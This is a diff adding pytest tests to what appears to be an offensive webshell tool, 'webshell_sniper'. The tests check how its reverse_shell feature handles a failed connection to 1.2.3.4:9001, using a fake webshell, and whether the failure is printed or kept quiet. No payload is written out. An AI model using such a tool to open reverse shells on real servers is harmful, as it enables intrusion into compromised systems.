@@ -65,3 +65,29 @@ def test_reverse_shell_attempt_timeout_is_applied_and_restored():
     assert ws.seen_timeout == 3.0  # the short timeout was in force during the attempt
     assert ws.transport.config.timeout == 15.0  # ...and restored afterwards
 
+
+class _FakeWSNoConnect:
+    """`bash` present, but the payload returns normally — i.e. never connected."""
+
+    def __init__(self):
+        self.transport = _FakeTransport()
+
+    def run_command(self, command):
+        return "/bin/bash" if command.startswith("which") and "bash" in command else ""
+
+
+def test_reverse_shell_quiet_suppresses_failure_chatter(capsys):
+    from webshell_sniper.features.revshell import reverse_shell
+
+    assert reverse_shell(_FakeWSNoConnect(), "1.2.3.4", 9001, method="bash", quiet=True) is False
+    captured = capsys.readouterr()
+    assert "No reverse-shell method succeeded" not in (captured.out + captured.err)
+
+
+def test_reverse_shell_loud_reports_failure(capsys):
+    from webshell_sniper.features.revshell import reverse_shell
+
+    assert reverse_shell(_FakeWSNoConnect(), "1.2.3.4", 9001, method="bash") is False
+    captured = capsys.readouterr()
+    assert "No reverse-shell method succeeded" in (captured.out + captured.err)
+
